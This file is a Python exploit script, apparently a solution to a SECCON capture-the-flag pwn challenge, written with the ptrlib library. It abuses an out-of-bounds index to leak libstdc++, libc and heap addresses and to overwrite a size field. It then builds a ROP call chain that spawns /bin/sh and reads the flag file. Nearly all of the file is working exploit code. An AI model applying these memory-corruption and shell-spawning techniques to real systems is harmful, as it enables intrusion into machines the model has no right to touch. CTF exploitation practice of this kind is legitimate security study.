from ptrlib import *
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "9999"))

def Set(index, value, recover=None):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("index = ", index)
    sock.sendlineafter("value = ", value)
    if recover is not None:
        sock.sendlineafter(": ", 1 if recover else 0)

def Get(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("index = ", index)
    return int(sock.recvlineafter("= "))

#sock = Process("./chall")
libstdcpp = ELF("./libstdc++.so.6.0.33")
libc = ELF("./libc.so.6")
sock = Socket(HOST, PORT)

sock.sendlineafter("size = ", 0x98 // 4)

# Leak library and heap addresses
Set(-1, 0, False)
libstdcpp.base = (Get(6) | (Get(7) << 32)) - 0xd2100
libc.base = libstdcpp.base - 0x240000

buffer_base = (Get(22) | (Get(23) << 32)) - 0x80
logger.info("buffer = " + hex(buffer_base))

# Overwrite size
rop_add_prbpPfh_cl_lodsd = libc.base + 0x0005aaef
Set(-1, 0, True)
sock.sendlineafter("index = ", 26)
sock.sendlineafter("value = ", rop_add_prbpPfh_cl_lodsd & 0xffffffff)

# Prepare call chain
rop_mov_rdi_prcxP8h_call_prcx = libc.base + 0x000a571f

# call [rcx]
target = libc.base + 0x582c2
Set(0 // 4 + 0, target & 0xffffffff)
Set(0 // 4 + 1, target >> 32)
# mov rdi, [rcx+8]
Set(8 // 4 + 0, (buffer_base + 0x10) & 0xffffffff)
Set(8 // 4 + 1, (buffer_base + 0x10) >> 32)
# cmd
Set(0x10 // 4 + 0, u32("/bin"))
Set(0x10 // 4 + 1, u32("/sh\0"))

# Win
Set(-1, 0, True)
sock.sendlineafter("index = ", 56+26)
sock.sendlineafter("value = ", rop_mov_rdi_prcxP8h_call_prcx & 0xffffffff)

sock.sendline("cat /flag*")
print(sock.recvregex(r"SECCON\{.+\}"))

sock.close()
